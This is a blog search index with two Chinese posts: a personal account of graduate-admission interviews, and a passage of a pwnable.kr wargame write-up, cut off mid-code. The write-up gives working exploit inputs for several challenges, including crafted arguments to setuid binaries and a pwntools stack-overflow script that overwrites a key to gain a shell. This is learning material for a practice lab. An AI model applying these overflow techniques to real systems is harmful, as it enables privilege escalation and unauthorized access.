<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>保研经历</title>
      <url>/blog/2018/10/12/block2/</url>
      <content type="html"><![CDATA[<p>声明：本文中<strong>贵系</strong>特指清华大学计算机系，<strong>北叉</strong>特指北京大学前沿交叉研究院下属的北京大数据研究中心（其实好像也不完全是下属）。</p><h2 id="简练版（可供定位）"><a href="#简练版（可供定位）" class="headerlink" title="简练版（可供定位）"></a>简练版（可供定位）</h2><p>本科学校：河海大学，211中游吧，非一流学校<br>本科专业：计算机科学与技术，非一流专业<br>排名：前五学期绩点4/184，前六学期绩点5/184，推免综合排名5/184<br>个人信息：四级569，六级543。CCF优秀大学生，国家奖学金，河海大学优秀学生。ICPC银，CCPC银，CSP 430分，蓝桥杯决赛一等奖1st（前面有一个人特等奖），还有一些乱七八糟的项目。以及，在乌云上提交过漏洞，创办了河海大学学生网络安全联盟，打过几次线上CTF。以及，南大南京地区机试1st，北叉机试2nd，贵系机试前20%<br>夏令营情况：南大开放日（拿到offer），贵系、北叉（进入复试），北大信科、上交、复旦（未进入复试）<br>预推免情况：清华网研院（拿到offer），浙大（未进入复试）<br>最终去向：清华大学-网研院-网络空间安全</p><h2 id="流水账（真的很长）"><a href="#流水账（真的很长）" class="headerlink" title="流水账（真的很长）"></a>流水账（真的很长）</h2><p>废话很多，而且写得很私人啦。。。轻点吐槽QAQ</p><h3 id="高傲的自我"><a href="#高傲的自我" class="headerlink" title="高傲的自我"></a>高傲的自我</h3><p>我从大一就在想保研的事情，当然事实证明想是没什么用的，真正行动起来的人才是最牛逼的（比如距离近的北漂实习，距离远的跟本校老师做科研等）。大三寒假听了一些公益课，感觉还挺好的，也不是很费时间，把这件事情系统地学习了一遍。因为感觉自己很牛逼，但是本专业一个去清北的学长都没有，所以在保研交流群强行私聊几个外校的学长定位了一下，总体看法是清北没什么大问题。然后又跟几个高中同学说了一下我想去贵系，他们也都觉得我能行，说实话我还满惊讶的，毕竟很多是高考高我六七十分的人。。。（可以看出我这个高中还是读得挺值的，这个保研交流群加得就更值了！）<br>所以直白地说，我从一开始就是奔着清北去的，当然这样既有好处也有坏处。好处是，为了进入复试我每天都在加深对清北老师的了解，发邮件联系他们；坏处在于，暂时没什么时间充实自己的履历，而且导致报其他夏令营的时候漫不经心，比如我完全可以报上交的专硕和复旦的大数据院，但是我还是都报了计算机系学硕，而我的情况在过去几年里都是不可能通过初审的！<br><strong>所以这里划个重点，大家设立目标之后还是有必要提防这些隐性的坏处。</strong></p><h3 id="无力的气愤"><a href="#无力的气愤" class="headerlink" title="无力的气愤"></a>无力的气愤</h3><p>贵系的系统一开放我就填了（6月1日），老师那栏填了自己联系的Y老师。Y老师方向比较偏，但是反正大家都跟我说进了夏令营以后还是能随便聊的也就无所谓了（因为其他也没什么人理我啊）。但是还是发生了一些不好的事情，6月上旬老师还一直问我暑假什么时候见面和实习，但是我6月19号的时候再给他发邮件，得到的回复却是：</p><blockquote><p>前段时间有位很优秀的同学找我，我可能更倾向于招他读博士。<br>目前看我只有一个名额，因此不再考虑你了。抱歉！<br>如果需要我可以帮你推荐给我系其他老师，看看他们是否还有名额。</p></blockquote><p>当时感觉非常生气，但又非常无力。主要还是怕进不了复试，毕竟学校和名次都不怎么样，他回信也没有讲清楚到底推不推荐我。后面我就一边恐慌一边联系别的老师，好在最终还是进了复试，仔细回想一下反而觉得Y老师可能是太老实了。。。</p><h3 id="顺利的开端"><a href="#顺利的开端" class="headerlink" title="顺利的开端"></a>顺利的开端</h3><p>北叉初审竟然也过了！后来才知道是当时只联系过一次的D老师推荐了我。然后南大开放日初审毫无悬念地过了。北叉的通知是夏令营分两拨，但是可以都参加，南大的通知是本地人只有一天。然而这俩还是撞了，打电话问南大能不能调到外地的那天，答：不可以。本来已经要抛弃北叉第一批了，结果北叉又发了个通知，大意：还是只办一次吧！惊喜地发现南大的机试比完过去正好可以！因为北叉第一天除了报到也没啥重要活动。<br>到了南大开放日这天（7月10日），下午一直在教室里等面试，很多人感到被刁难的面试我异常轻松地过去了，面完有两个面试官都打我电话，总共三个面试官。然后晚上机试真的很傻逼，我光是看去年的题还没有觉得很傻逼，但是真的到了现场四十多分钟就做完了。出来本来想直接去车站的，但是发现自己手机快没电了，就跑去L学长的工位充了会儿电，感觉他们的实验室还是不错的~</p><h4 id="附-南大面试"><a href="#附-南大面试" class="headerlink" title="附 南大面试"></a>附 南大面试</h4><ul><li>介绍你一个项目（英语，下面都是中文）</li><li>详细地问了问其中一个项目。是传统神经网络还是深度神经网络？介绍一下线性回归的几种方法？怎么解决过拟合的问题？为什么不用pca之类的？特征值和特征向量是什么作用？</li><li>线程和进程的区别？</li><li>你觉得你这些项目里面最有挑战性的一个/一部分？</li><li>你做了这么多数据挖掘的项目，是不是对未来的研究有比较明确的规划？</li><li>有8个球，有一个比其他重一点，给一个天平，怎么用最少次数找出来？</li><li>x1+x2+x3=10 有多少组正整数解？多少组非负整数解？</li></ul><h4 id="附-南大机试"><a href="#附-南大机试" class="headerlink" title="附 南大机试"></a>附 南大机试</h4><ol><li>给出一个多叉树（多于二叉）的先序遍历和后序遍历，（每个节点以字符串标识），求该树的深度。<br>没有数据范围。。。</li><li><p>给出初始单词，终止单词，以及词典，所有单词均为长度相等的小写字母串，求从初始单词变换到终止单词的路径长度。每次变换只允许改变一个字符，且所有中间单词只能是词典中的，如果不能做到则输出0。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">hit</span></div><div class="line">cog</div><div class="line">hot dot dog cog dig</div></pre></td></tr></table></figure><p>该样例中有<code>hit-&gt;hot-&gt;dot-&gt;dog-&gt;cog</code>，所以路径长度为5<br>词典单词数&lt;=20000 串长度&lt;=5</p></li><li>一台机器有 ni 张面值为 ki 的纸币，给定一个c，求小于等于c的一个最大金额，使得机器能恰好给出。<br>c&lt;=100000 ni&lt;=1000 ki&lt;=1000 种类数&lt;=10</li></ol><h3 id="虚拟的兴趣"><a href="#虚拟的兴趣" class="headerlink" title="虚拟的兴趣"></a>虚拟的兴趣</h3><p>其实我对机器学习的原理根本不感兴趣，反而是它能干的那些事情吸引着我，也即应用。当然这一点是我后来才想明白的，这就奠定了我这次很严重的失策。在北叉采集志愿的时候已经有录取到北叉的D学长告诉我深度学习实验室很难进的而且北叉的第二志愿基本也没用上过，第一志愿挂了就走远了，但是我后来第一志愿还是填了那个最牛逼的深度学习实验室。。。这里说一下北叉其实有一个笔试，但是计算机的考了可能会起到反作用，所以一般不考，不过按照趋势可能会改成都要考。。。<br>我是南大比完直接乘软卧到北京的，到北京后直接赶去北大，中途也没去宾馆放行李，有点累。赶到北大的时候营员好像都在听讲座，然后就在外面桌上趴了一会儿，等他们结束以后领了饭卡跟着别人吃了饭。然后去宾馆放行李，友谊宾馆实在是有点大。。。就是整个庄园的那种感觉，导航又没从正门走，进去以后还摸了好久。。。跟室友打了个招呼，然后几乎是睡了一个下午。。。晚上机试状态还行，总共8个题做了7个，基本上都是我排第一，也就最后十分钟被干了，后来又问了一下第一是北大本校的，还是挺高兴的。又问了问D学长，面试安排一般都后半夜才发，然后就直接睡觉了。<br>第二天起来，果然看到了03:35才发的邮件，我的面试时间是下午，不过还是上午就去了北大。吃完中饭过去，一起闲聊发现我面的是第一志愿，但也有人面的不是第一志愿，可能机试还是满重要的。又得知我面的那个是zzh主面，已经感觉有点可怕了。。。然后面的过程中怎么说呢，我只能说他问的东西我看到过，但是没那么了解，但是也根本不想那么了解，总之大概就是问十次答一次的水平。面完我感觉有点崩，但是D学长和我想着毕竟机试第二应该还行吧其实也没有特别消沉。深夜回想又觉得zzh问的应该是他觉得最简单的问题，自己真是菜得可以。。。<br>第三天起来，赶紧听学长的话给在联系的D老师发了个邮件表明一下自己很希望能跟着他。然后中午就收到了回信，大意就是你不太适合做科研。。。当时我还在吃饭，心里拔凉拔凉的。吃完回到理科楼先是发给D学长看了一下，他表示这就是婉拒了。我激动了很久还是感觉受不了，后来就躲进厕所了，一边反复读邮件一边大哭（这可真羞耻。。。）哭完终于感觉舒服了一点，毕竟马上就要清华夏令营了不能再难过了，很希望那里会属于我。</p><h4 id="附-北叉面试"><a href="#附-北叉面试" class="headerlink" title="附 北叉面试"></a>附 北叉面试</h4><p>还有很多很多没答出来的，就记不得了。。。</p><ul><li>adaboosting具体是干嘛的</li><li>机器学习了解多少？（我答了神经网络）</li><li>那更之前的呢？</li><li>朴素贝叶斯分类只分01，具体写出来</li><li>概率论知道哪些定理？</li><li>随机变量独立强还是不相关强，什么情况下是一样的？</li><li>平面上最近点对（分治，但是没讲清楚）</li><li>网格图每个格一个权值，每次可以走到右边一列的上面一格、右边一列的等高一格、右边一列的下面一格，问从左上角走到右下角的最小权值和。（随便dp一下）</li></ul><h3 id="再度的打击"><a href="#再度的打击" class="headerlink" title="再度的打击"></a>再度的打击</h3><p>这天（7月13日）上午就已经把行李搬进了z同学的宿舍里，下午去报到、试机，试机题好像很难，不过我做了一会儿天猫就来带我去吃饭了，<del>然后我们一起宰了尧神一顿烤肉hhhhh。</del>晚上继续感受寝室，插水卡洗澡甚至有点紧张😂<br>第二天（7月14日）早上z同学带我吃饭，然后就去机试，三道题很快就读完了，总之就是都很麻烦。。。比较蛋疼的是明明选了C++11提交我用gets还是一直CE了，然后就去沟通反馈，总之耽误了不少时间。。。能看到自己的分数，结束的时候是170，而且没有一题是AC的，总之就是有点菜。。。跟钟队长面基一起吃了个饭，下午是听讲座时间，主要介绍了计算机系各个所，还有一位优秀学姐分享，好像博一刚结束就有不少paper，总之就是很厉害。。。<br>晚上冷餐会很特别，每张桌会有同一个所的几个老师，桌上有立牌会写是哪个所，所以我觉得更加印证了没有老师推荐根本进不来夏令营。。。我本来是随便坐了一个媒体所的桌子，然后拿食物的时候正好碰到了一个南邮的熟人，这个南邮的熟人又正好跟一个正在sXXXXXXe组实习的人一起，他知道我名字以后就告诉我lyy老师在组会的时候提到过我，我就突然感觉找到了归属，跑到了lyy老师那张桌。然后lyy老师就跟大家一起聊天，感觉人特别好，虽然我只跟他联系过两次但是他真的对我有印象，这时我就决定了明天面试sXXXXXXe组。晚宴结束回宿舍，在等z同学下楼来给我开门的时候被看门的发现了，逮住问了几句，虽然后来z同学也帮着跟楼长交涉了一下，但是还是没用，没得住宿舍了，凉凉。。。先跟天猫打了个电话，他说他那边地方很小，后来我又想到lyy老师邮件里让我选一篇论文写阅读报告我还没有做，索性就直接去肯德基通宵了。。。读论文真的好累的，我好像到五点半的时候才基本都弄明白，然后写的报告也比较简单。<br>第三天（7月15日）先去照澜院那边打印了我的报告，又在高校里看见了居民区还是有点怪异。然后就去sXXXXXXe组的面试房间，虽然感觉到了lyy老师在大老板面前一直想拉我一把，但是我做的相关东西和能力确实不如其他人。。。面试的有八个人，最后我才知道其中<strong>有三个名额已经钦定了</strong>，剩下五个人抢一个名额，所以结果也是我凉凉了。。。晚上住到了北京南站附近，然后听学长的建议给每个所的老师都发了邮件，其中就包括了之前翻册子的时候感觉很有意思的cz老师，cz老师晚上十点钟回了邮件让我加他微信，加了微信就约我明天见个面。<br>第四天（7月16日）早上雨特别大，cz老师还说如果不方便后面可以远程讲，当然我还是想去一下啦。然后就到他的办公室聊了聊，cz老师和我感觉都不错。中午上高铁回家，在高铁上接到了w老师的电话，说可以来面试一下，但是我感觉其实不是很想去他们组，而且已经在高铁上了，就大概敷衍了一下。。。其实这样真的很危险，因为cz老师并没有给我承诺任何事情！<br><strong>所以这里又有个重点：贵系夏令营其实是个无限的东西！你哪怕在北京多住一个月跟老师互动都可以！</strong></p><h4 id="附-清华机试试机"><a href="#附-清华机试试机" class="headerlink" title="附 清华机试试机"></a>附 清华机试试机</h4><p><a href="https://github.com/Smlight/Programming-Contest/tree/master/2018/07/13/%E6%B8%85%E5%8D%8E%E5%A4%8F%E4%BB%A4%E8%90%A5%E6%9C%BA%E8%AF%95%E8%AF%95%E6%9C%BA" target="_blank" rel="noopener">试机题截图</a></p><h3 id="最终的上岸"><a href="#最终的上岸" class="headerlink" title="最终的上岸"></a>最终的上岸</h3><p>夏令营之后cz老师给我布置了一个任务，后来我也联系了一个浙大的老师，也跟老师说了九月份要参加清华的预推免不能确定去浙大。到网研院预推免的时候我做了个原型出来，写进了ppt里，还问清本的同学要了计算机网络的复习提纲2333333 这回准备得挺充分的，综合面试和专业面试也都感觉挺顺利的。最后专业面试结束，一出来就看到手机里有浙大没进入复试的短信，人生如戏= =<br>9月28日填系统的时候我们队在秦皇岛打CCPC，虽说清华不用夜里填啦，但还是凑了个热闹，三个人集体熬夜填志愿hhhhhhh 正式赛结束以后14:58收到了复试通知的短信，赶紧去确认了一下。然后一直到傍晚5点多了还没收到短信，推免系统也没有新的通知，问了一下别人都已经确认待录取了，有点蛋疼= = 遂怒翻推免系统，在最下面“我的消息”里面点进去找到了一个待录取通知，确认了一下。后来发现其实16:58就收到短信了，但是被我的智障手机拦截了。。。两个格式完全一样的短信一个放过一个拦截？？。。。<br>总之保研经历就这样结束了，后面就是在群里看看各位大佬，吹吹水，群里各个都是人才，说话又好听，我超喜欢这里的。</p><h4 id="附-网研院面试"><a href="#附-网研院面试" class="headerlink" title="附 网研院面试"></a>附 网研院面试</h4><ul><li>讲一下RIP协议</li><li>OSI/RM七层模型每一层都稍微讲一下</li><li>CSMA/CD是什么，具体过程</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到我的offer还是很少的，很多事情充满了巧合，大家常说的清北复交浙我到九月的时候还一个都没有，而且南大我其实也没找到特别满意的老师，失学边缘。。。大家一定要好好努力不要学我。。。<br>最后真诚地感谢很多学长、老师、还有自己的高中同学！没有他们我肯定会更不顺利一点。。。</p>]]></content>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable初步体验</title>
      <url>/blog/2018/09/24/pwnable-practice/</url>
      <content type="html"><![CDATA[<h2 id="0x0-Toddler’s-Bottle"><a href="#0x0-Toddler’s-Bottle" class="headerlink" title="0x0 Toddler’s Bottle"></a>0x0 Toddler’s Bottle</h2><h3 id="0x00-fd"><a href="#0x00-fd" class="headerlink" title="0x00 fd"></a>0x00 fd</h3><p>首先稍微学习一下<em>file descriptor</em>，然后登录上去看看到底是什么情况。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">fd@ubuntu:~$ ls -alh</div><div class="line">total 40K</div><div class="line">drwxr-x---  5 root   fd   4.0K Oct 26  2016 .</div><div class="line">drwxr-xr-x 92 root   root 4.0K Aug 12 10:28 ..</div><div class="line">d---------  2 root   root 4.0K Jun 12  2014 .bash_history</div><div class="line">-rw-------  1 root   root  128 Oct 26  2016 .gdb_history</div><div class="line">dr-xr-xr-x  2 root   root 4.0K Dec 19  2016 .irssi</div><div class="line">drwxr-xr-x  2 root   root 4.0K Oct 23  2016 .pwntools-cache</div><div class="line">-r-sr-x---  1 fd_pwn fd   7.2K Jun 11  2014 fd</div><div class="line">-rw-r--r--  1 root   root  418 Jun 11  2014 fd.c</div><div class="line">-r--r-----  1 fd_pwn root   50 Jun 11  2014 flag</div></pre></td></tr></table></figure></p><p>可以看到除了隐藏文件就是 fd fd.c flag ，所以目标就是获取flag中的内容然后提交到网站上。<br>但是由于权限问题我们是不能直接查看flag文件的，实际上在不能成为root的情况下只有通过可执行文件fd才有可能操作flag文件，因为fd带有<em>Set UID</em>权限，在它运行的时候可以暂时获得fd_pwn这个用户的权限。那么剩下的那个fd.c文件可以推测是fd文件的源代码。<br>另外，fd用户对当前目录没有<em>write</em>权限，所以要通过查看fd.c分析fd的行为。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</div><div class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">        len = read(fd, buf, <span class="number">32</span>);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>程序里用到的<em>file descriptor</em>竟然不是<em>open</em>返回的，而是根据命令行参数变换出来的，也就是说要给出一个数字，使得这个数字作为文件描述符对应的文件里的内容是特定的字符串。这在正常情况下是不可能的，因为一个文件的文件描述符只在同一个进程里是确定的，更何况当前用户也不能新建文件。但是UNIX下确实有三个文件的文件描述符是<strong>绝对确定</strong>的，它们就是 stdin stdout stderr 。所以只要让<code>fd</code>变量等于<strong>0</strong>，我们就可以输入任意的内容，我觉得至少有三种方法：</p><ol><li>非常普通的输入0x1234对应的十进制数，<code>./fd 4660</code></li><li><p>看起来太fancy但是实际上非常有用的命令，涉及到shell语言的弱引用以及python的命令行执行字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./fd `python -c <span class="string">"print 0x1234"</span>`</div></pre></td></tr></table></figure></li><li><p>gdb可用，应该可以直接set fd甚至set buf（没有实际尝试）</p></li></ol><p>最后把打出来的内容贴到网站上这题就通过了。</p><h3 id="0x01-collision"><a href="#0x01-collision" class="headerlink" title="0x01 collision"></a>0x01 collision</h3><p>权限控制和目标之类的跟上一题都是一样的，之后都省略了。<br>home目录提供了可执行程序和C语言源程序，先看一下源程序：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</div><div class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</div><div class="line">                res += ip[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>首先看到用法是命令行加一个字符串参数执行，字符串长度等于20才会进行之后的操作。然后看到check_password里面其实就是把4个char拼成1个int并全加起来。其实我们只需要4个就能控制最终结果，又因为\x00是C语言的字符串结束标志，我们可以前16个字节全都填\x01，然后计算一下最后4个字节应该是什么，注意一下小端序就可以。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./col `python -c <span class="string">"print '\x01'*16 + '\xe8\x05\xd9\x1d'"</span>`</div></pre></td></tr></table></figure></p><p><em>NOTE: 最开始以为都要可打印字符暴力了很久。。。其实大概只要不包含控制字符就可以了？</em></p><h3 id="0x02-bof"><a href="#0x02-bof" class="headerlink" title="0x02 bof"></a>0x02 bof</h3><p>先把文件下载下来，稍微检查一下。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">➜  Documents checksec bof</div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/bof'</span></div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div></pre></td></tr></table></figure></p><p>源代码里有一个gets函数可以溢出。虽然开了金丝雀，反正还是拖进IDA看一看。一看，相对ebp寻址，那么首先输入偏移量这么多的字符，再输入4个字符覆盖栈中存的ebp，再输入4个字符覆盖栈中的返回地址，最后输入4个字符覆盖函数的第一个参数也就是key。这些可以参考<a href="/blog/2018/07/19/c-stack-frame/">C语言函数调用栈（一）</a>。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">sh = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x2c</span> + <span class="string">'bbbb'</span> + <span class="string">'rrrr'</span> + p32(<span class="number">0xcafebabe</span>)</div><div class="line">sh.sendline(payload)</div><div class="line">sh.interactive()</div></pre></td></tr></table></figure></p><p>至于金丝雀为什么没有起作用其实从汇编层面更明显一点，实际上直到这个函数将要return的时候才会检查金丝雀值，然而程序执行到if然后马上又执行了一个system，也就是说在我们获得shell的时候还没金丝雀啥事，所以当然就可以啦。</p><h3 id="0x03-flag"><a href="#0x03-flag" class="headerlink" title="0x03 flag"></a>0x03 flag</h3><p>执行一下，就输出一句话，也不接收什么东西。。。<br>刚开始直接扔IDA了。。。然后看到了一大堆乱七八糟的东西。。。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">➜  Documents checksec flag </div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/flag'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">    Packer:   Packed with UPX</div></pre></td></tr></table></figure></p><p>可以发现最下面出现一个packer，查一查UPX，开源软件而且可以直接apt装，装完以后解包再看。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">➜  Documents upx <span class="_">-d</span> flag         </div><div class="line">                       Ultimate Packer <span class="keyword">for</span> eXecutables</div><div class="line">                          Copyright (C) 1996 - 2013</div><div class="line">UPX 3.91        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Sep 30th 2013</div><div class="line"></div><div class="line">        File size         Ratio      Format      Name</div><div class="line">   --------------------   ------   -----------   -----------</div><div class="line">    887219 &lt;-    335288   37.79%  linux/ElfAMD   flag</div><div class="line"></div><div class="line">Unpacked 1 file.</div><div class="line">➜  Documents checksec flag       </div><div class="line">[*] <span class="string">'/home/zyyyyy/Documents/flag'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div></pre></td></tr></table></figure></p><p>正常了，再扔IDA里面，F5看了半天。后来觉得应该看一下所有string(Shift+F12)，第一行就出现了UPX，长得就像flag，提交一下果然对了。对了之后再看，发现在汇编界面main函数puts往下第四行赫然就写着cs:flag。。。猜测是因为用了静态链接，导致IDA反编译输出的代码非常复杂，啥都看不太懂。。。<br><em>NOTE: 不能总是一上来就F5，不仅没啥提高还会导致丢失一些信息。。。</em></p><h3 id="0x05-random"><a href="#0x05-random" class="headerlink" title="0x05 random"></a>0x05 random</h3><p>有源代码直接看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</div><div class="line">random = rand();        <span class="comment">// random value!</span></div></pre></td></tr></table></figure></p><p>显然<code>rand()</code>产生的是伪随机数，且不播种种子就是0，可以写个python算出应该输入的值<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>libc = cdll.LoadLibrary(<span class="string">"libc.so.6"</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = libc.rand()                                                             </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = r ^ <span class="number">0xdeadbeef</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> x</div><div class="line"><span class="number">3039230856</span></div></pre></td></tr></table></figure></p><h3 id="0x08-mistake"><a href="#0x08-mistake" class="headerlink" title="0x08 mistake"></a>0x08 mistake</h3><p>直接看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> fd;</div><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">sleep(time(<span class="number">0</span>)%<span 